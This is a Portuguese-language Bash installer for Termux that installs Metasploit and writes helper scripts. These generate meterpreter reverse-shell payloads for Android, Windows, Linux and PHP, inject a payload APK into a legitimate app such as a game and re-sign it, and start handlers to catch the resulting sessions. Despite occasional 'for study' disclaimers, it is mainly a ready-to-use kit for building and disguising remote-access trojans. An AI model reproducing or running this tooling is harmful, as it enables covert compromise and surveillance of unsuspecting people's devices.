#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# Script..: PeekSecurity Framework Installer
# Criado em: 04/05/2026
# Site....: peeksecurity
# ============================================

# Cores personalizadas
PS='\033[0;36m'      # Cyan (principal)
PS_R='\033[0;31m'    # Vermelho
PS_G='\033[0;32m'    # Verde
PS_Y='\033[1;33m'    # Amarelo
PS_B='\033[1;34m'    # Azul
PS_W='\033[1;37m'    # Branco
PS_M='\033[0;35m'    # Magenta
RS='\033[0m'         # Reset

# Função para mostrar o banner
show_banner() {
    clear
    echo -e "${PS}"
    echo "╔═══════════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                                   ║"
    echo "║   ██████  ███████ ███████ ██   ██ ███████ ███████ ██████  ██    ██ ██████ ██ ████████╗"
    echo "║   ██   ██ ██      ██      ██  ██  ██      ██      ██   ██ ██    ██ ██   ██ ██    ██   "
    echo "║   ██████  █████   ███████ █████   ███████ █████   ██████  ██    ██ ██████  ██    ██   "
    echo "║   ██      ██           ██ ██  ██       ██ ██      ██   ██ ██    ██ ██   ██ ██    ██   "
    echo "║   ██      ███████ ███████ ██   ██ ███████ ███████ ██   ██  ██████  ██   ██ ██    ██   "
    echo "║                                                                                   ║"
    echo "║   ╔═══════════════════════════════════════════════════════════════════════════╗   ║"
    echo "║   ║                         METASPLOIT ULTIMATE v3.0                          ║   ║"
    echo "║   ║                   Onde a segurança encontra a excelência                  ║   ║"
    echo "║   ╚═══════════════════════════════════════════════════════════════════════════╝   ║"
    echo "║                                                                                   ║"
    echo "║   ┌───────────────────────────────────────────────────────────────────────────┐   ║"
    echo "║   │  Módulos incluídos:                                                        │   ║"
    echo "║   │    ✓ Instalação completa do Metasploit Framework                          │   ║"
    echo "║   │    ✓ Correção definitiva Nokogiri (Ruby 3.4+)                             │   ║"
    echo "║   │    ✓ PS-Payload - Gerador inteligente de payloads                        │   ║"
    echo "║   │    ✓ PS-Camouflage - Camuflagem em APKs para estudos                     │   ║"
    echo "║   │    ✓ PS-Listener - Iniciador rápido de listeners                         │   ║"
    echo "║   │    ✓ PS-Android - Kit completo para Android                              │   ║"
    echo "║   └───────────────────────────────────────────────────────────────────────────┘   ║"
    echo "║                                                                                   ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${RS}"
}

# ============================================
# CONFIGURAÇÕES GLOBAIS
# ============================================
PS_DIR="$HOME/.peeksecurity"
PS_LOG="$PS_DIR/install_$(date +%Y%m%d_%H%M%S).log"
PS_BACKUP="$PS_DIR/backup_$(date +%Y%m%d_%H%M%S)"
PS_MSF_DIR="$PREFIX/opt/ps-metasploit"
PS_RUBY="3.2.5"
PS_WORK="$PS_DIR/temp"
PS_PAYLOADS_DIR="$PS_DIR/payloads"
PS_APKS_DIR="$PS_DIR/apks"

# Cria diretórios
mkdir -p "$PS_DIR" "$PS_BACKUP" "$PS_WORK" "$PS_PAYLOADS_DIR" "$PS_APKS_DIR" 2>/dev/null

# ============================================
# FUNÇÕES DE LOG E UTILITÁRIOS
# ============================================
ps_log() { 
    echo -e "${PS_G}[✓]${RS} $1" | tee -a "$PS_LOG"
}

ps_warn() { 
    echo -e "${PS_Y}[!]${RS} $1" | tee -a "$PS_LOG"
}

ps_error() { 
    echo -e "${PS_R}[✗]${RS} $1" 
    exit 1
}

ps_step() { 
    echo -e "\n${PS_B}┌────────────────────────────────────────┐${RS}"
    echo -e "${PS_B}│${RS} ${PS_W}➜ $1${RS}${PS_B}${RS}"
    echo -e "${PS_B}└────────────────────────────────────────┘${RS}\n" | tee -a "$PS_LOG"
}

# ============================================
# VERIFICAÇÃO DE AMBIENTE
# ============================================
check_environment() {
    ps_step "Verificando ambiente"
    
    # Verifica Termux
    if [[ ! -d "/data/data/com.termux" ]]; then
        ps_error "Este script deve ser executado no Termux!"
    fi
    ps_log "Termux detectado"
    
    # Verifica Android version
    if command -v getprop >/dev/null 2>&1; then
        local sdk=$(getprop ro.build.version.sdk)
        ps_log "Android SDK: $sdk"
        if [[ $sdk -ge 33 ]]; then
            ps_warn "Android 13+ detectado - Configurando permissões"
            termux-setup-storage 2>/dev/null || true
        fi
    fi
    
    # Verifica espaço em disco
    local space=$(df /data | awk 'NR==2 {print $4}')
    if [[ $space -lt 4000000 ]]; then
        ps_error "Espaço insuficiente! Necessário 4GB. Livre: $((space/1024))MB"
    fi
    ps_log "Espaço disponível: $((space/1024))MB"
    
    # Verifica internet
    if ! ping -c 1 8.8.8.8 >/dev/null 2>&1; then
        ps_error "Sem conexão com internet!"
    fi
    ps_log "Conexão com internet OK"
}

# ============================================
# BACKUP DE CONFIGURAÇÕES
# ============================================
backup_existing() {
    ps_step "Fazendo backup de configurações anteriores"
    
    if [[ -d "$PS_MSF_DIR" ]] || [[ -f "$PREFIX/bin/msfconsole" ]]; then
        ps_warn "Instalação existente detectada"
        cp -r "$HOME/.msf4" "$PS_BACKUP/" 2>/dev/null || true
        cp -r "$PS_MSF_DIR" "$PS_BACKUP/" 2>/dev/null || true
        ps_log "Backup salvo em: $PS_BACKUP"
    else
        ps_log "Nenhuma instalação anterior encontrada"
    fi
}

# ============================================
# INSTALAÇÃO DE DEPENDÊNCIAS
# ============================================
install_dependencies() {
    ps_step "Instalando dependências essenciais"
    
    ps_log "Atualizando repositórios..."
    pkg update -y >> "$PS_LOG" 2>&1
    
    local packages=(
        wget curl git nano
        autoconf bison flex
        libtool make cmake
        clang binutils
        readline openssl-tool
        postgresql postgresql-contrib
        libxml2 libxslt
        libyaml libffi
        ncurses ncurses-utils
        python python-pip
        android-tools termux-api
        resolv-conf
        zip unzip
        aapt apksigner
    )
    
    ps_log "Instalando pacotes..."
    for pkg in "${packages[@]}"; do
        echo -ne "   $pkg... \r"
        pkg install -y "$pkg" >> "$PS_LOG" 2>&1
        echo -e "   ${PS_G}✓${RS} $pkg"
    done
    
    # Configura DNS
    echo "nameserver 8.8.8.8" > "$PREFIX/etc/resolv.conf"
    echo "nameserver 8.8.4.4" >> "$PREFIX/etc/resolv.conf"
    
    ps_log "Dependências instaladas com sucesso"
}

# ============================================
# INSTALAÇÃO DO RUBY
# ============================================
install_ruby() {
    ps_step "Instalando Ruby $PS_RUBY"
    
    # Remove gems conflitantes
    gem list --no-version 2>/dev/null | xargs gem uninstall -aIx 2>/dev/null || true
    
    # Instala ruby-build
    if [[ ! -d "/tmp/ruby-build" ]]; then
        git clone --depth 1 https://github.com/rbenv/ruby-build.git /tmp/ruby-build >> "$PS_LOG" 2>&1
    fi
    
    ps_log "Compilando Ruby (pode levar 5-10 minutos)..."
    /tmp/ruby-build/bin/ruby-build "$PS_RUBY" "$PREFIX" >> "$PS_LOG" 2>&1
    
    # Configura Ruby
    echo "gem: --no-document" > "$HOME/.gemrc"
    export PATH="$PREFIX/bin:$PATH"
    
    # Verifica
    if ! ruby --version | grep -q "$PS_RUBY"; then
        ps_error "Falha na instalação do Ruby"
    fi
    
    ps_log "Ruby $PS_RUBY instalado: $(ruby --version)"
}

# ============================================
# CORREÇÃO DEFINITIVA DO NOKOGIRI
# ============================================
fix_nokogiri() {
    ps_step "Aplicando correção definitiva do Nokogiri"
    
    # Cria patch universal
    cat > "$PREFIX/include/ps_nokogiri.h" << 'EOF'
#ifndef PS_NOKOGIRI_PATCH_H
#define PS_NOKOGIRI_PATCH_H

#include <gumbo.h>

#ifdef __cplusplus
extern "C" {
#endif

static inline GumboNode* ps_gumbo_parse(const char* html) {
    if (!html) return NULL;
    return gumbo_parse(html);
}

#define nokogiri_gumbo_parse ps_gumbo_parse
#define gumbo_parse_wrapper ps_gumbo_parse

#ifdef __cplusplus
}
#endif

#endif
EOF

    # Configura ambiente
    export NOKOGIRI_USE_SYSTEM_LIBRARIES=1
    export BUNDLE_BUILD__NOKOGIRI="--use-system-libraries"
    export CFLAGS="-I$PREFIX/include -DPS_NOKOGIRI_PATCH"
    export LDFLAGS="-L$PREFIX/lib"
    
    ps_log "Patch do Nokogiri aplicado com sucesso"
}

# ============================================
# INSTALAÇÃO DO METASPLOIT
# ============================================
install_metasploit() {
    ps_step "Instalando Metasploit Framework"
    
    # Remove instalação anterior
    rm -rf "$PS_MSF_DIR"
    
    ps_log "Clonando repositório oficial..."
    git clone --depth 1 https://github.com/rapid7/metasploit-framework.git "$PS_MSF_DIR" >> "$PS_LOG" 2>&1
    
    cd "$PS_MSF_DIR"
    
    ps_log "Instalando gems (pode levar 15-20 minutos)..."
    
    # Instala bundler
    gem install bundler -v 2.4.22 >> "$PS_LOG" 2>&1
    
    # Configura bundle
    bundle config set --local without 'development test' >> "$PS_LOG" 2>&1
    
    # Instala gems
    if ! bundle install --jobs=4 --retry=3 >> "$PS_LOG" 2>&1; then
        ps_warn "Falha na instalação completa. Tentando modo seguro..."
        bundle install --without development test doc --jobs=2 >> "$PS_LOG" 2>&1
    fi
    
    # Cria links
    for tool in msfconsole msfvenom msfrpc msfdb; do
        if [[ -f "$PS_MSF_DIR/$tool" ]]; then
            ln -sf "$PS_MSF_DIR/$tool" "$PREFIX/bin/ps-$tool"
            ln -sf "$PS_MSF_DIR/$tool" "$PREFIX/bin/$tool"
        fi
    done
    
    ps_log "Metasploit Framework instalado"
}

# ============================================
# CONFIGURAÇÃO DO BANCO DE DADOS
# ============================================
configure_database() {
    ps_step "Configurando PostgreSQL"
    
    local PGDATA="$PREFIX/var/lib/postgresql"
    mkdir -p "$PGDATA"
    
    if [[ ! -f "$PGDATA/PG_VERSION" ]]; then
        initdb "$PGDATA" >> "$PS_LOG" 2>&1
    fi
    
    # Configura pg_hba
    cat > "$PGDATA/pg_hba.conf" << 'EOF'
local   all   all   trust
host    all   all   127.0.0.1/32   trust
host    all   all   ::1/128        trust
EOF
    
    # Inicia PostgreSQL
    pg_ctl -D "$PGDATA" start >> "$PS_LOG" 2>&1 || true
    sleep 3
    
    # Cria banco
    createuser msf 2>/dev/null || true
    createdb -O msf msf 2>/dev/null || true
    
    ps_log "PostgreSQL configurado"
}

# ============================================
# MÓDULO: PS-PAYLOAD (Gerador Inteligente)
# ============================================
create_ps_payload() {
    ps_step "Criando módulo PS-Payload"
    
    cat > "$PREFIX/bin/ps-payload" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# PS-Payload - Gerador Inteligente de Payloads
# PeekSecurity Framework
# ============================================

PS='\033[0;36m'
PS_G='\033[0;32m'
PS_Y='\033[1;33m'
PS_R='\033[0;31m'
RS='\033[0m'

show_help() {
    echo -e "${PS}═══════════════════════════════════════════════════════════${RS}"
    echo -e "${PS}            PS-PAYLOAD - GERADOR INTELIGENTE${RS}"
    echo -e "${PS}═══════════════════════════════════════════════════════════${RS}"
    echo ""
    echo -e "${PS_G}[+] Uso:${RS} ps-payload <opção>"
    echo ""
    echo -e "${PS}[OPÇÕES]:${RS}"
    echo "  android <LHOST> <LPORT>    - Gera payload Android"
    echo "  windows <LHOST> <LPORT>    - Gera payload Windows"
    echo "  linux <LHOST> <LPORT>      - Gera payload Linux"
    echo "  web <LHOST> <LPORT>        - Gera payload Web (PHP)"
    echo "  list                       - Lista payloads disponíveis"
    echo "  help                       - Mostra esta ajuda"
    echo ""
    echo -e "${PS}[EXEMPLOS]:${RS}"
    echo "  ps-payload android 192.168.1.100 4444"
    echo "  ps-payload windows 10.0.0.5 8080"
    echo ""
}

case "$1" in
    android)
        if [[ -z "$2" || -z "$3" ]]; then
            echo -e "${PS_R}[!] Uso: ps-payload android <LHOST> <LPORT>${RS}"
            exit 1
        fi
        echo -e "${PS_G}[+] Gerando payload Android...${RS}"
        msfvenom -p android/meterpreter/reverse_tcp LHOST="$2" LPORT="$3" -o "$HOME/.peeksecurity/payloads/android_payload_$(date +%Y%m%d_%H%M%S).apk"
        echo -e "${PS_G}[✓] Payload gerado em: $HOME/.peeksecurity/payloads/${RS}"
        ;;
    windows)
        if [[ -z "$2" || -z "$3" ]]; then
            echo -e "${PS_R}[!] Uso: ps-payload windows <LHOST> <LPORT>${RS}"
            exit 1
        fi
        echo -e "${PS_G}[+] Gerando payload Windows...${RS}"
        msfvenom -p windows/meterpreter/reverse_tcp LHOST="$2" LPORT="$3" -f exe -o "$HOME/.peeksecurity/payloads/windows_payload_$(date +%Y%m%d_%H%M%S).exe"
        echo -e "${PS_G}[✓] Payload gerado em: $HOME/.peeksecurity/payloads/${RS}"
        ;;
    linux)
        if [[ -z "$2" || -z "$3" ]]; then
            echo -e "${PS_R}[!] Uso: ps-payload linux <LHOST> <LPORT>${RS}"
            exit 1
        fi
        echo -e "${PS_G}[+] Gerando payload Linux...${RS}"
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$2" LPORT="$3" -f elf -o "$HOME/.peeksecurity/payloads/linux_payload_$(date +%Y%m%d_%H%M%S).elf"
        echo -e "${PS_G}[✓] Payload gerado em: $HOME/.peeksecurity/payloads/${RS}"
        ;;
    web)
        if [[ -z "$2" || -z "$3" ]]; then
            echo -e "${PS_R}[!] Uso: ps-payload web <LHOST> <LPORT>${RS}"
            exit 1
        fi
        echo -e "${PS_G}[+] Gerando payload Web (PHP)...${RS}"
        msfvenom -p php/meterpreter_reverse_tcp LHOST="$2" LPORT="$3" -o "$HOME/.peeksecurity/payloads/web_payload_$(date +%Y%m%d_%H%M%S).php"
        echo -e "${PS_G}[✓] Payload gerado em: $HOME/.peeksecurity/payloads/${RS}"
        ;;
    list)
        echo -e "${PS_G}[+] Payloads disponíveis:${RS}"
        msfvenom -l payloads | grep -E "android|windows|linux|php"
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        echo -e "${PS_R}[!] Opção inválida! Use 'ps-payload help'${RS}"
        exit 1
        ;;
esac
EOF
    
    chmod +x "$PREFIX/bin/ps-payload"
    ps_log "Módulo PS-Payload criado"
}

# ============================================
# MÓDULO: PS-CAMOUFLAGE (Camuflagem em APKs)
# ============================================
create_ps_camouflage() {
    ps_step "Criando módulo PS-Camouflage"
    
    cat > "$PREFIX/bin/ps-camouflage" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# PS-Camouflage - Camuflagem de Payloads APK
# PeekSecurity Framework - Para Estudos
# ============================================

PS='\033[0;36m'
PS_G='\033[0;32m'
PS_Y='\033[1;33m'
PS_R='\033[0;31m'
RS='\033[0m'

PS_APKS_DIR="$HOME/.peeksecurity/apks"

show_banner() {
    echo -e "${PS}═══════════════════════════════════════════════════════════${RS}"
    echo -e "${PS}         PS-CAMOUFLAGE - APK CAMOUFLAGE TOOL${RS}"
    echo -e "${PS}═══════════════════════════════════════════════════════════${RS}"
}

show_help() {
    show_banner
    echo ""
    echo -e "${PS_G}[+] Uso:${RS} ps-camouflage <apk_payload> <apk_legitimo>"
    echo ""
    echo -e "${PS}[OPÇÕES]:${RS}"
    echo "  bind <payload> <legitimo>   - Insere payload em APK legítimo"
    echo "  info <apk>                 - Mostra informações do APK"
    echo "  sign <apk>                 - Assina o APK"
    echo "  help                       - Mostra esta ajuda"
    echo ""
    echo -e "${PS}[EXEMPLO]:${RS}"
    echo "  ps-camouflage bind meu_payload.apk jogo.apk"
    echo ""
}

bind_payload() {
    local payload="$1"
    local legit="$2"
    
    if [[ ! -f "$payload" ]]; then
        echo -e "${PS_R}[!] Payload não encontrado: $payload${RS}"
        exit 1
    fi
    
    if [[ ! -f "$legit" ]]; then
        echo -e "${PS_R}[!] APK legítimo não encontrado: $legit${RS}"
        exit 1
    fi
    
    echo -e "${PS_G}[+] Injetando payload no APK legítimo...${RS}"
    
    # Cria diretório de trabalho
    local work_dir="$PS_APKS_DIR/camouflage_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$work_dir"
    
    # Descompila os APKs
    echo -e "${PS}[*] Descompilando APKs...${RS}"
    apktool d "$payload" -o "$work_dir/payload" 2>/dev/null
    apktool d "$legit" -o "$work_dir/legit" 2>/dev/null
    
    # Copia classes do payload
    cp -r "$work_dir/payload/smali"/* "$work_dir/legit/smali/" 2>/dev/null
    
    # Modifica AndroidManifest
    sed -i 's/</<uses-permission android:name="android.permission.INTERNET"\/>\n</' "$work_dir/legit/AndroidManifest.xml"
    sed -i 's/</<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"\/>\n</' "$work_dir/legit/AndroidManifest.xml"
    
    # Recompila
    echo -e "${PS}[*] Recompilando APK...${RS}"
    apktool b "$work_dir/legit" -o "$work_dir/output.apk" 2>/dev/null
    
    # Assina
    echo -e "${PS}[*] Assinando APK...${RS}"
    apksigner sign --ks <(echo "Keystore") "$work_dir/output.apk" 2>/dev/null || {
        # Gera keystore temporário se não existir
        keytool -genkey -v -keystore "$work_dir/ps.keystore" -alias ps -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=PS, OU=PS, O=PS, L=PS, S=PS, C=BR" -storepass ps123 -keypass ps123 2>/dev/null
        apksigner sign --ks "$work_dir/ps.keystore" --ks-pass pass:ps123 --key-pass pass:ps123 "$work_dir/output.apk" 2>/dev/null
    }
    
    # Move resultado
    local final_name="camouflaged_$(basename "$legit" .apk)_$(date +%Y%m%d).apk"
    mv "$work_dir/output.apk" "$PS_APKS_DIR/$final_name"
    
    echo -e "${PS_G}[✓] APK camuflado criado: $PS_APKS_DIR/$final_name${RS}"
    echo -e "${PS_Y}[!] APK original foi modificado. Use apenas para estudos!${RS}"
}

case "$1" in
    bind)
        if [[ -z "$2" || -z "$3" ]]; then
            echo -e "${PS_R}[!] Uso: ps-camouflage bind <payload.apk> <legitimo.apk>${RS}"
            exit 1
        fi
        bind_payload "$2" "$3"
        ;;
    info)
        if [[ -z "$2" ]]; then
            echo -e "${PS_R}[!] Uso: ps-camouflage info <apk>${RS}"
            exit 1
        fi
        aapt dump badging "$2"
        ;;
    sign)
        if [[ -z "$2" ]]; then
            echo -e "${PS_R}[!] Uso: ps-camouflage sign <apk>${RS}"
            exit 1
        fi
        apksigner sign --ks "$HOME/.peeksecurity/ps.keystore" "$2" 2>/dev/null || echo -e "${PS_R}[!] Keystore não encontrado${RS}"
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        show_help
        ;;
esac
EOF
    
    chmod +x "$PREFIX/bin/ps-camouflage"
    ps_log "Módulo PS-Camouflage criado"
}

# ============================================
# MÓDULO: PS-LISTENER (Iniciador Rápido)
# ============================================
create_ps_listener() {
    ps_step "Criando módulo PS-Listener"
    
    cat > "$PREFIX/bin/ps-listener" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# PS-Listener - Iniciador Rápido de Listeners
# PeekSecurity Framework
# ============================================

PS='\033[0;36m'
PS_G='\033[0;32m'
PS_Y='\033[1;33m'
PS_R='\033[0;31m'
RS='\033[0m'

show_help() {
    echo -e "${PS}═══════════════════════════════════════════════════════════${RS}"
    echo -e "${PS}           PS-LISTENER - LISTENER RÁPIDO${RS}"
    echo -e "${PS}═══════════════════════════════════════════════════════════${RS}"
    echo ""
    echo -e "${PS_G}[+] Uso:${RS} ps-listener <lport>"
    echo ""
    echo -e "${PS}[EXEMPLO]:${RS}"
    echo "  ps-listener 4444"
    echo ""
}

if [[ -z "$1" ]]; then
    show_help
    exit 1
fi

echo -e "${PS_G}[+] Iniciando listener na porta $1...${RS}"
echo -e "${PS_G}[+] Payloads compatíveis:${RS}"
echo "    - android/meterpreter/reverse_tcp"
echo "    - windows/meterpreter/reverse_tcp"
echo "    - linux/x86/meterpreter/reverse_tcp"
echo ""

# Gera arquivo de recurso temporário
cat > "/tmp/ps_listener.rc" << EOF
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT $1
set ExitOnSession false
exploit -j -z
EOF

msfconsole -r "/tmp/ps_listener.rc"
EOF
    
    chmod +x "$PREFIX/bin/ps-listener"
    ps_log "Módulo PS-Listener criado"
}

# ============================================
# MÓDULO: PS-ANDROID (Kit Completo)
# ============================================
create_ps_android() {
    ps_step "Criando módulo PS-Android"
    
    cat > "$PREFIX/bin/ps-android" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# PS-Android - Kit Completo para Android
# PeekSecurity Framework - Para Estudos
# ============================================

PS='\033[0;36m'
PS_G='\033[0;32m'
PS_Y='\033[1;33m'
PS_R='\033[0;31m'
RS='\033[0m'

show_banner() {
    echo -e "${PS}═══════════════════════════════════════════════════════════${RS}"
    echo -e "${PS}           PS-ANDROID - KIT COMPLETO ANDROID${RS}"
    echo -e "${PS}═══════════════════════════════════════════════════════════${RS}"
}

show_help() {
    show_banner
    echo ""
    echo -e "${PS_G}[+] Uso:${RS} ps-android <opção>"
    echo ""
    echo -e "${PS}[OPÇÕES]:${RS}"
    echo "  create <LHOST> <LPORT>     - Cria APK payload e listener"
    echo "  camuflage <apk_legitimo>   - Camufla payload em APK"
    echo "  info <apk>                 - Analisa APK"
    echo "  help                       - Mostra esta ajuda"
    echo ""
    echo -e "${PS}[EXEMPLO]:${RS}"
    echo "  ps-android create 192.168.1.100 4444"
    echo "  ps-android camuflage jogo.apk"
    echo ""
}

case "$1" in
    create)
        if [[ -z "$2" || -z "$3" ]]; then
            echo -e "${PS_R}[!] Uso: ps-android create <LHOST> <LPORT>${RS}"
            exit 1
        fi
        echo -e "${PS_G}[+] Criando payload Android...${RS}"
        ps-payload android "$2" "$3"
        echo -e "${PS_G}[+] Iniciando listener...${RS}"
        echo -e "${PS_Y}[!] Em outro terminal, execute: ps-listener $3${RS}"
        ;;
    camuflage)
        if [[ -z "$2" ]]; then
            echo -e "${PS_R}[!] Uso: ps-android camuflage <apk_legitimo>${RS}"
            exit 1
        fi
        # Procura o payload mais recente
        local latest_payload=$(ls -t "$HOME/.peeksecurity/payloads"/android_payload_*.apk 2>/dev/null | head -1)
        if [[ -z "$latest_payload" ]]; then
            echo -e "${PS_R}[!] Nenhum payload encontrado. Crie um primeiro com: ps-android create${RS}"
            exit 1
        fi
        echo -e "${PS_G}[+] Camuflando payload em $2...${RS}"
        ps-camouflage bind "$latest_payload" "$2"
        ;;
    info)
        if [[ -z "$2" ]]; then
            echo -e "${PS_R}[!] Uso: ps-android info <apk>${RS}"
            exit 1
        fi
        ps-camouflage info "$2"
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        show_help
        ;;
esac
EOF
    
    chmod +x "$PREFIX/bin/ps-android"
    ps_log "Módulo PS-Android criado"
}

# ============================================
# CONFIGURAÇÃO DE ALIASES
# ============================================
configure_aliases() {
    ps_step "Configurando aliases do sistema"
    
    cat >> "$HOME/.bashrc" << 'EOF'

# ============================================
# PeekSecurity Framework Aliases
# ============================================
alias ps-msf='ps-msfconsole'
alias ps-start='ps-listener'
alias ps-gen='ps-payload'
alias ps-hide='ps-camouflage'
alias ps-kit='ps-android'

# PeekSecurity Prompt
export PS1='\[\e[0;36m\]PS\[\e[0m\]\[\e[1;34m\]:\[\e[0m\]\[\e[0;32m\]\w\[\e[0m\]\[\e[1;34m\]\$\[\e[0m\] '

# Path dos payloads
export PS_PAYLOADS="$HOME/.peeksecurity/payloads"
export PS_APKS="$HOME/.peeksecurity/apks"
EOF
    
    ps_log "Aliases configurados"
}

# ============================================
# RELATÓRIO FINAL
# ============================================
show_completion() {
    echo ""
    echo -e "${PS}╔═══════════════════════════════════════════════════════════════╗${RS}"
    echo -e "${PS}║${RS}                                                                   ${PS}║${RS}"
    echo -e "${PS}║${RS}     ${PS_G}✅ PEEKSECURITY FRAMEWORK INSTALADO COM SUCESSO!${RS}                  ${PS}║${RS}"
    echo -e "${PS}║${RS}                                                                   ${PS}║${RS}"
    echo -e "${PS}╚═══════════════════════════════════════════════════════════════╝${RS}"
    
    echo ""
    echo -e "${PS_W}📌 COMANDOS DISPONÍVEIS:${RS}"
    echo ""
    echo -e "  ${PS_G}▶ ps-msfconsole${RS}     - Inicia o Metasploit"
    echo -e "  ${PS_G}▶ ps-payload${RS}         - Gera payloads (android,windows,linux,web)"
    echo -e "  ${PS_G}▶ ps-camouflage${RS}      - Camufla payloads em APKs legítimos"
    echo -e "  ${PS_G}▶ ps-listener${RS}        - Inicia listener rápido"
    echo -e "  ${PS_G}▶ ps-android${RS}         - Kit completo para Android"
    echo ""
    echo -e "${PS_W}📁 DIRETÓRIOS PEEKSECURITY:${RS}"
    echo ""
    echo -e "  ${PS_Y}Logs:${RS}      $PS_DIR/"
    echo -e "  ${PS_Y}Payloads:${RS}  $PS_PAYLOADS_DIR/"
    echo -e "  ${PS_Y}APKs:${RS}      $PS_APKS_DIR/"
    echo ""
    echo -e "${PS_W}🚀 EXEMPLOS RÁPIDOS:${RS}"
    echo ""
    echo -e "  ${PS_CYAN}1. Criar payload Android:${RS}"
    echo "     ps-payload android 192.168.1.100 4444"
    echo ""
    echo -e "  ${PS_CYAN}2. Camuflar em APK legítimo:${RS}"
    echo "     ps-camouflage bind payload.apk jogo.apk"
    echo ""
    echo -e "  ${PS_CYAN}3. Iniciar listener:${RS}"
    echo "     ps-listener 4444"
    echo ""
    echo -e "  ${PS_CYAN}4. Kit completo (payload + listener):${RS}"
    echo "     ps-android create 192.168.1.100 4444"
    echo ""
    
    echo -e "${PS_Y}📝 Log da instalação: $PS_LOG${RS}"
    echo ""
    
    # Recarrega configurações
    source "$HOME/.bashrc" 2>/dev/null || true
}

# ============================================
# INSTALAÇÃO PRINCIPAL
# ============================================
main() {
    show_banner
    
    echo -e "\n${PS_W}Bem-vindo ao instalador oficial da PeekSecurity!${RS}"
    echo -e "${PS_Y}Este processo irá instalar o Metasploit Framework completo${RS}"
    echo -e "${PS_Y}com todos os módulos de automação.${RS}\n"
    
    read -p "$(echo -e ${PS_CYAN}"Continuar? [s/N]: "${RS})" -n 1 -r
    echo
    [[ ! $REPLY =~ ^[Ss]$ ]] && echo -e "${PS_R}Instalação cancelada.${RS}" && exit 0
    
    # Executa instalação
    check_environment
    backup_existing
    install_dependencies
    install_ruby
    fix_nokogiri
    install_metasploit
    configure_database
    create_ps_payload
    create_ps_camouflage
    create_ps_listener
    create_ps_android
    configure_aliases
    
    show_completion
}

# Executa
main
